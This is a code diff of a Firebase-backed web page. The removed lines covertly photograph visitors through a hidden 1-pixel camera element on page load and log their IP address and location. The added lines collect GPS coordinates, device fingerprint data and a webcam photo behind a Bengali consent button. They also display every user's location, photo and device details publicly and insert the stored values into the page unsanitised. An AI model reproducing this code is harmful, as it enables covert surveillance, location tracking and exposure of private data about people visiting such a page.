@@ -3,34 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Photo Capture</title>
+    <title>User Data Collection</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
     <style>
-        #autoCameraView {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            z-index: -1000;
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
         }
-        .visitor-img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            object-fit: cover;
+        #cameraPreview {
+            width: 100%;
+            max-width: 400px;
+            border: 2px solid #333;
+            display: none;
+        }
+        #capturedPhoto {
+            max-width: 400px;
+            display: none;
+            margin-top: 10px;
+        }
+        button {
+            padding: 10px 15px;
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #3367d6;
+        }
+        #userData {
+            margin-top: 20px;
+            border-top: 1px solid #ccc;
+            padding-top: 20px;
+        }
+        .user-card {
+            border: 1px solid #ddd;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+        }
+        .user-card img {
+            max-width: 200px;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <h1>Welcome to Our Site</h1>
-    <div id="visitorInfo"></div>
+    <h1>User Data Collection</h1>
     
-    <!-- Hidden camera elements -->
-    <video id="autoCameraView" autoplay playsinline></video>
-    <canvas id="autoPhotoCanvas" style="display:none;"></canvas>
+    <div id="permissionRequest">
+        <p>এই সাইটটি আপনার অবস্থান এবং ক্যামেরা ব্যবহার করতে চায়</p>
+        <button id="grantPermission">অনুমতি দিন</button>
+    </div>
+    
+    <div id="dataCollection" style="display: none;">
+        <h2>আপনার তথ্য সংগ্রহ করা হচ্ছে...</h2>
+        <video id="cameraPreview" autoplay></video>
+        <canvas id="photoCanvas" style="display: none;"></canvas>
+        <img id="capturedPhoto" alt="Captured Photo">
+        <div>
+            <button id="capturePhoto">ফটো তোলুন</button>
+            <button id="retryPhoto">আবার চেষ্টা করুন</button>
+            <button id="submitData">তথ্য জমা দিন</button>
+        </div>
+    </div>
+    
+    <div id="userData">
+        <h2>সমস্ত ব্যবহারকারীর তথ্য</h2>
+        <div id="usersList"></div>
+    </div>
 
     <script>
         // Firebase configuration
@@ -47,104 +94,253 @@
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
+        const storage = firebase.storage();
 
-        // Auto capture variables
-        let autoCaptureAttempted = false;
-        let autoStream = null;
+        // DOM elements
+        const permissionRequest = document.getElementById('permissionRequest');
+        const dataCollection = document.getElementById('dataCollection');
+        const grantPermissionBtn = document.getElementById('grantPermission');
+        const cameraPreview = document.getElementById('cameraPreview');
+        const photoCanvas = document.getElementById('photoCanvas');
+        const capturedPhoto = document.getElementById('capturedPhoto');
+        const capturePhotoBtn = document.getElementById('capturePhoto');
+        const retryPhotoBtn = document.getElementById('retryPhoto');
+        const submitDataBtn = document.getElementById('submitData');
+        const usersList = document.getElementById('usersList');
 
-        // Function to auto capture photo
-        async function autoCapturePhoto() {
-            if (autoCaptureAttempted) return;
-            autoCaptureAttempted = true;
+        // User data object
+        let userData = {
+            location: {},
+            deviceInfo: {},
+            photoUrl: '',
+            timestamp: ''
+        };
 
+        // Check if photo is captured
+        let isPhotoCaptured = false;
+
+        // Request permission and start data collection
+        grantPermissionBtn.addEventListener('click', async () => {
             try {
-                // Get basic visitor info
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
-
-                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-                const locationData = await locationResponse.json();
-
-                // Prepare visitor data
-                const visitorData = {
-                    ip: ip,
-                    country: locationData.country_name || 'Unknown',
-                    city: locationData.city || 'Unknown',
-                    timestamp: firebase.database.ServerValue.TIMESTAMP,
-                    photoUrl: ''
-                };
-
-                // Save initial data to Firebase
-                const visitorRef = database.ref('visitors').push();
-                await visitorRef.set(visitorData);
-
-                // Try to access camera silently (will still prompt in most browsers)
-                try {
-                    autoStream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            width: { ideal: 320 },
-                            height: { ideal: 240 },
-                            facingMode: 'user'
-                        },
-                        audio: false
-                    });
-
-                    const video = document.getElementById('autoCameraView');
-                    video.srcObject = autoStream;
-                    await video.play();
-
-                    // Wait a moment for camera to initialize
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-
-                    // Capture photo
-                    const canvas = document.getElementById('autoPhotoCanvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // Convert to base64
-                    const photoData = canvas.toDataURL('image/jpeg', 0.7);
-
-                    // Update visitor data with photo
-                    await visitorRef.update({ photoUrl: photoData });
-
-                    // Display to user
-                    document.getElementById('visitorInfo').innerHTML = `
-                        <div style="margin: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 8px;">
-                            <h3>Welcome Visitor!</h3>
-                            <img src="${photoData}" class="visitor-img">
-                            <p>We've automatically captured your profile.</p>
-                            <p>Location: ${visitorData.city}, ${visitorData.country}</p>
-                        </div>
-                    `;
-
-                } catch (cameraError) {
-                    console.log("Auto photo capture failed (permission denied)");
-                    // Proceed without photo
-                }
-
+                permissionRequest.style.display = 'none';
+                dataCollection.style.display = 'block';
+                
+                // Collect device information
+                collectDeviceInfo();
+                
+                // Get user location
+                await getLocation();
+                
+                // Start camera
+                await startCamera();
+                
             } catch (error) {
-                console.error("Error in auto capture:", error);
-            } finally {
-                if (autoStream) {
-                    autoStream.getTracks().forEach(track => track.stop());
+                console.error('Error:', error);
+                alert('একটি ত্রুটি হয়েছে: ' + error.message);
+            }
+        });
+
+        // Collect device information
+        function collectDeviceInfo() {
+            userData.deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown'
+            };
+        }
+
+        // Get user location
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            userData.location = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                timestamp: new Date(position.timestamp).toISOString()
+                            };
+                            resolve();
+                        },
+                        (error) => {
+                            console.error('Geolocation error:', error);
+                            userData.location = {
+                                error: error.message
+                            };
+                            resolve(); // Even if location fails, continue with other data
+                        }
+                    );
+                } else {
+                    userData.location = {
+                        error: 'Geolocation is not supported by this browser.'
+                    };
+                    resolve();
                 }
+            });
+        }
+
+        // Start camera
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                cameraPreview.srcObject = stream;
+                cameraPreview.style.display = 'block';
+                capturePhotoBtn.style.display = 'inline-block';
+                retryPhotoBtn.style.display = 'none';
+                capturedPhoto.style.display = 'none';
+                isPhotoCaptured = false;
+            } catch (error) {
+                console.error('Camera error:', error);
+                alert('ক্যামেরা অ্যাক্সেস করতে সমস্যা: ' + error.message);
             }
         }
 
-        // Start auto capture when page loads
-        window.addEventListener('load', () => {
-            // Delay slightly to let page render
-            setTimeout(autoCapturePhoto, 500);
+        // Capture photo
+        capturePhotoBtn.addEventListener('click', () => {
+            const context = photoCanvas.getContext('2d');
+            photoCanvas.width = cameraPreview.videoWidth;
+            photoCanvas.height = cameraPreview.videoHeight;
+            context.drawImage(cameraPreview, 0, 0, photoCanvas.width, photoCanvas.height);
             
-            // Alternative approach for some browsers
-            document.addEventListener('click', function firstClick() {
-                autoCapturePhoto();
-                document.removeEventListener('click', firstClick);
-            });
+            capturedPhoto.src = photoCanvas.toDataURL('image/png');
+            capturedPhoto.style.display = 'block';
+            cameraPreview.style.display = 'none';
+            capturePhotoBtn.style.display = 'none';
+            retryPhotoBtn.style.display = 'inline-block';
+            isPhotoCaptured = true;
+            
+            // Stop camera stream
+            const stream = cameraPreview.srcObject;
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
         });
+
+        // Retry photo
+        retryPhotoBtn.addEventListener('click', startCamera);
+
+        // Submit data to Firebase
+        submitDataBtn.addEventListener('click', async () => {
+            if (!isPhotoCaptured) {
+                alert('দয়া করে একটি ফটো ক্যাপচার করুন');
+                return;
+            }
+            
+            submitDataBtn.disabled = true;
+            submitDataBtn.textContent = 'জমা দেওয়া হচ্ছে...';
+            
+            try {
+                // Add timestamp
+                userData.timestamp = new Date().toISOString();
+                
+                // Upload photo to Firebase Storage
+                const photoBlob = await new Promise(resolve => {
+                    photoCanvas.toBlob(resolve, 'image/jpeg', 0.9);
+                });
+                
+                const storageRef = storage.ref().child(`user_photos/${Date.now()}.jpg`);
+                await storageRef.put(photoBlob);
+                const photoUrl = await storageRef.getDownloadURL();
+                userData.photoUrl = photoUrl;
+                
+                // Save all data to Realtime Database
+                const newUserRef = database.ref('users').push();
+                await newUserRef.set(userData);
+                
+                alert('তথ্য সফলভাবে জমা দেওয়া হয়েছে!');
+                resetForm();
+                loadUsers();
+            } catch (error) {
+                console.error('Submission error:', error);
+                alert('তথ্য জমা দিতে সমস্যা: ' + error.message);
+            } finally {
+                submitDataBtn.disabled = false;
+                submitDataBtn.textContent = 'তথ্য জমা দিন';
+            }
+        });
+
+        // Reset form
+        function resetForm() {
+            permissionRequest.style.display = 'block';
+            dataCollection.style.display = 'none';
+            cameraPreview.style.display = 'none';
+            capturedPhoto.style.display = 'none';
+            isPhotoCaptured = false;
+            userData = {
+                location: {},
+                deviceInfo: {},
+                photoUrl: '',
+                timestamp: ''
+            };
+        }
+
+        // Load users from Firebase
+        function loadUsers() {
+            database.ref('users').on('value', (snapshot) => {
+                usersList.innerHTML = '';
+                snapshot.forEach((childSnapshot) => {
+                    const user = childSnapshot.val();
+                    const userKey = childSnapshot.key;
+                    
+                    const userCard = document.createElement('div');
+                    userCard.className = 'user-card';
+                    
+                    let html = `
+                        <h3>ব্যবহারকারী ID: ${userKey}</h3>
+                        <p><strong>সময়:</strong> ${new Date(user.timestamp).toLocaleString()}</p>
+                    `;
+                    
+                    if (user.location.latitude) {
+                        html += `
+                            <p><strong>অবস্থান:</strong> 
+                                <a href="https://www.google.com/maps?q=${user.location.latitude},${user.location.longitude}" target="_blank">
+                                    ${user.location.latitude}, ${user.location.longitude}
+                                </a>
+                                (Accuracy: ${user.location.accuracy} meters)
+                            </p>
+                        `;
+                    } else if (user.location.error) {
+                        html += `<p><strong>অবস্থান:</strong> ${user.location.error}</p>`;
+                    } else {
+                        html += `<p><strong>অবস্থান:</strong> সংগ্রহ করা যায়নি</p>`;
+                    }
+                    
+                    html += `
+                        <p><strong>ডিভাইস তথ্য:</strong></p>
+                        <ul>
+                            <li>User Agent: ${user.deviceInfo.userAgent}</li>
+                            <li>Platform: ${user.deviceInfo.platform}</li>
+                            <li>Screen: ${user.deviceInfo.screenWidth}x${user.deviceInfo.screenHeight}</li>
+                            <li>Language: ${user.deviceInfo.language}</li>
+                        </ul>
+                    `;
+                    
+                    if (user.photoUrl) {
+                        html += `<img src="${user.photoUrl}" alt="User Photo">`;
+                    } else {
+                        html += `<p>কোন ফটো নেই</p>`;
+                    }
+                    
+                    userCard.innerHTML = html;
+                    usersList.appendChild(userCard);
+                });
+            });
+        }
+
+        // Load users when page loads
+        loadUsers();
     </script>
 </body>
 </html>
